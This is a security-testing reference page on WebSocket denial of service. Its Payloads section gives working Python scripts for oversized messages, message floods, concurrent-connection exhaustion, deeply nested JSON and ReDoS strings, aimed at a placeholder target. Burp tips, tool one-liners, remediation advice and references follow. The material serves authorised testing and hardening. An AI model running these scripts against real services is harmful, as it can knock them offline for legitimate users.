# WebSocket DoS (Large Messages / Resource Exhaustion)

## Overview
WebSocket connections are persistent, bidirectional, and low-overhead compared to HTTP — characteristics that make them efficient for real-time communication but also make them attractive targets for Denial of Service attacks. WebSocket DoS can be achieved by sending abnormally large messages, rapid message floods, or specially crafted messages that trigger expensive server-side processing. Because WebSocket connections are stateful and server resources are allocated per connection, even a single malicious client can exhaust CPU, memory, or connection limits on insufficiently protected servers.

## How It Works
Unlike HTTP, which has a request-response cycle with natural boundaries, WebSocket connections are long-lived. Servers must buffer incoming messages, process them, and maintain connection state. If the server:
- Does not limit message size — an attacker sends a 100MB binary frame
- Does not limit message rate — attacker sends 10,000 messages/second
- Processes messages with expensive operations (regex, XML parsing, JSON schema validation, database queries) — attacker crafts messages that maximize processing time
- Does not limit concurrent connections per IP — attacker opens thousands of connections

Any of these conditions can cause resource exhaustion that degrades or prevents service for legitimate users.

## Impact
- Full service outage for all WebSocket-connected clients
- Degraded performance affecting the entire application (shared process/memory)
- Memory exhaustion causing server crashes or OOM kills
- CPU exhaustion preventing normal message processing
- Connection pool exhaustion — legitimate users cannot connect
- Cascading failure into database or backend services (if each WS message triggers backend calls)

## Where to Look
- WebSocket endpoints without rate limiting
- Message handlers that process large or complex data structures
- Servers that spawn a thread or process per WebSocket connection
- Endpoints that accept binary data without size limits
- Endpoints that perform recursive or nested operations based on message depth
- Platforms with known WebSocket server implementations (socket.io, ws, SockJS) that may have unpatched DoS vectors

## Testing Steps
1. Identify WebSocket endpoints and authenticate if necessary.
2. Send a large text message and observe server behavior:
   ```python
   ws.send('A' * 10_000_000)  # 10 MB message
   ```
3. Measure server response time before and after — increased latency suggests resource impact.
4. Send messages at high rate and measure when errors or slowdowns occur:
   ```python
   for i in range(10000):
       ws.send('{"ping": true}')
   ```
5. Open many concurrent connections from the same IP and check if limits are enforced.
6. Send messages with deeply nested JSON to trigger recursive processing:
   ```python
   payload = '{"a":' * 10000 + '1' + '}' * 10000
   ws.send(payload)
   ```
7. Monitor server metrics (CPU, memory, connection count) during tests.
8. Test fragmented frames: send a single message split into thousands of fragments.
9. Test for malformed frames that cause server-side parsing errors (use raw socket).
10. Test reconnection behavior — does the server have connection backoff?

## Payloads / Techniques

Large message test:
```python
import websocket
import time

ws = websocket.create_connection('wss://target.com/ws',
    header=['Cookie: session=your_session'])

sizes = [1_000, 10_000, 100_000, 1_000_000, 10_000_000]
for size in sizes:
    payload = 'A' * size
    start = time.time()
    ws.send(payload)
    try:
        response = ws.recv()
        elapsed = time.time() - start
        print(f"Size {size}: response in {elapsed:.3f}s")
    except Exception as e:
        print(f"Size {size}: Error - {e}")
        break
```

Rapid message flood:
```python
import websocket
import threading
import time

def flood(ws_url, cookie, count=10000):
    ws = websocket.create_connection(ws_url, header=[f'Cookie: {cookie}'])
    start = time.time()
    for i in range(count):
        ws.send(f'{{"seq":{i},"data":"test"}}')
    elapsed = time.time() - start
    print(f"Sent {count} messages in {elapsed:.2f}s ({count/elapsed:.0f} msg/s)")
    ws.close()

flood('wss://target.com/ws', 'session=your_session')
```

Concurrent connection exhaustion:
```python
import websocket
import threading
import time

connections = []
lock = threading.Lock()

def open_connection(url, cookie):
    try:
        ws = websocket.create_connection(url, header=[f'Cookie: {cookie}'], timeout=30)
        with lock:
            connections.append(ws)
        time.sleep(60)  # Hold connection open
    except Exception as e:
        print(f"Connection failed: {e}")

url = 'wss://target.com/ws'
cookie = 'session=your_session'

threads = []
for i in range(500):
    t = threading.Thread(target=open_connection, args=(url, cookie))
    t.daemon = True
    t.start()
    threads.append(t)
    if i % 50 == 0:
        print(f"Opened {len(connections)} connections so far")
    time.sleep(0.01)

print(f"Total connections established: {len(connections)}")
input("Press Enter to close all connections...")
for ws in connections:
    try: ws.close()
    except: pass
```

Deeply nested JSON (ReDoS / parsing DoS):
```python
import websocket
import json

ws = websocket.create_connection('wss://target.com/ws',
    header=['Cookie: session=your_session'])

# Deeply nested object
depth = 10000
nested = '"a"' 
for _ in range(depth):
    nested = f'{{"k":{nested}}}'

ws.send(nested)
print("Sent deeply nested JSON")
```

Long string field (for applications doing pattern matching):
```python
# If the server runs regex on message fields, this can cause ReDoS
import websocket
import re

ws = websocket.create_connection('wss://target.com/ws',
    header=['Cookie: session=your_session'])

# ReDoS-style payload for common vulnerable patterns like (a+)+ applied to:
evil_string = 'a' * 10000 + 'X'
ws.send(json.dumps({"search": evil_string, "type": "user_search"}))
```

Binary frame size test (using websocket raw mode):
```python
import websocket
import struct

ws = websocket.create_connection('wss://target.com/ws',
    header=['Cookie: session=your_session'])

# Send 50MB binary frame
ws.send_binary(b'\x00' * 50_000_000)
```

## Burp Suite Tips
- Use **Intruder** in "Sniper" mode on WebSocket messages with large payload lists to send many messages rapidly.
- The **Turbo Intruder** extension can send WebSocket messages at extremely high rates for rate-limit testing.
- Use **Repeater** to manually adjust message size and monitor server responses for timeouts or errors.
- Monitor the **Proxy WebSocket history** for error frames (opcode `0x8`) sent by the server after large messages.
- Use Burp's **Proxy > Intercept WebSockets** to pause and replay individual large frames.

## Tools
- wscat — `wscat -c wss://target.com/ws` then manually send large inputs
- websocat — pipe large files: `cat bigfile.txt | websocat wss://target.com/ws`
- Python websocket-client — flexible scripting for all DoS tests
- Artillery.io — load testing tool with WebSocket support
- k6 — modern load testing tool: `k6 run websocket-stress-test.js`
- Gatling — performance testing with WebSocket plugin
- wrk with WebSocket plugin — high-performance HTTP/WS benchmarking

## Remediation
- Enforce a maximum message size limit (e.g., 64KB for text, 1MB for binary) and close the connection with code 1009 if exceeded.
- Implement rate limiting per connection and per IP address (e.g., max 100 messages/second).
- Limit the number of concurrent WebSocket connections per IP and per user account.
- Implement message processing timeouts — if a message takes more than N milliseconds to process, drop it.
- Use non-blocking, asynchronous message processing to avoid blocking the event loop.
- Validate and enforce maximum depth/length for nested JSON or complex message structures.
- Implement connection backoff and reconnection limits to prevent connection storms.
- Use a WAF or DDoS protection service that supports WebSocket protocol awareness (Cloudflare, AWS WAF).
- Monitor WebSocket connection counts and message rates — alert on anomalous patterns.

## References
https://portswigger.net/web-security/websockets
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_for_WebSockets_Security_Flaws
https://www.rfc-editor.org/rfc/rfc6455#section-10.4
https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
